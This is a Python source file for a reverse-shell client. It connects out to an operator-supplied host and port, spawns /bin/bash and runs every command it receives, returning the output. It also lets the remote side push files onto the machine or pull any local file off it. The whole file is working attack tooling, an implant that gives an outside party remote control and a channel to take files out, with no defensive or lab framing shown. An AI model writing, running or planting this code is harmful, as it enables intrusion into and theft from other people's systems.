import subprocess
import argparse
import select
import socket
import time
# Constants
READY_STATUS = b"ready_3X1T_5TATUS="
EXIT_STATUS = b"_3X1T_5TATUS=0"
SENDING_FILE = b"sendingfile"
GETTING_FILE = b"gettingfile"

def connect_to_host(host, port):
    """Establishes a connection to the host."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def receive_file(filename, sock):
    """Receives a file from the socket and writes it to the local system."""
    with open(filename, "wb") as f:
        sock.send(READY_STATUS)
        while (data := sock.recv(1024)):
            f.write(data)

def send_file(filename, sock):
    """Reads a file from the local system and sends it through the socket."""
    with open(filename, "rb") as f:
        while (chunk := f.read(1024)):
            sock.send(chunk)
        sock.send(EXIT_STATUS)

def handle_file_transfers(data, s):
    """Handles file transfers based on the received data."""
    if SENDING_FILE in data:
        file = data.decode().split("sendingfile/")[1].split(" &&")[0].strip()
        receive_file(file, s)
    if GETTING_FILE in data:
        file = data.decode().split("gettingfile/")[1].split(" &&")[0].strip()
        send_file(file, s)

class Shell:
    def __init__(self):
        self.proc = subprocess.Popen(["/bin/bash"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.end_marker = "END_OF_COMMAND"

    def execute_command(self, command):
        command_with_marker = f"{command}; echo -n '{self.end_marker}'"
        self.proc.stdin.write((command_with_marker + "\n").encode())
        self.proc.stdin.flush()

    def read_output(self):
        out, err = b"", b""
        while True:
            reads = [self.proc.stdout.fileno(), self.proc.stderr.fileno()]
            ret = select.select(reads, [], [], 0.1)

            for fd in ret[0]:
                if fd == self.proc.stderr.fileno():
                    err += self.proc.stderr.read1()
                if fd == self.proc.stdout.fileno():
                    chunk = self.proc.stdout.read1()
                    out += chunk
                    if self.end_marker.encode() in chunk:
                        return out[:-len(self.end_marker)], err

def execute_command_and_send_response(data, s, shell):
    """Executes a command and sends the response back through the socket."""
    shell.execute_command(data.decode("utf-8"))
    stdout_value, stderr_value = shell.read_output()
    message_length = len(stdout_value) + len(stderr_value)
    print(message_length)

    if message_length > 0:
        s.sendall(message_length.to_bytes(4, byteorder="big"))
        s.sendall(stdout_value)
        s.sendall(stderr_value)
    else:
        stdout_value = b"INFO: no output"
        message_length = len(stdout_value)
        s.sendall(message_length.to_bytes(4, byteorder="big"))
        s.sendall(stdout_value)

def execute_command(s):
    """Receives commands from the socket, executes them and sends back the response."""
    shell = Shell()
    while True:
        data = s.recv(1024)
        print(data)

        handle_file_transfers(data, s)

        if not data:
            break

        try:
            execute_command_and_send_response(data, s, shell)
        except BrokenPipeError:
            print("Connection closed by the host.")
            break

def main():
    """Main function to parse arguments and start execution."""
    parser = argparse.ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("port", type=int)

    args = parser.parse_args()

    s = connect_to_host(args.host, args.port)
    execute_command(s)

if __name__ == "__main__":
    main()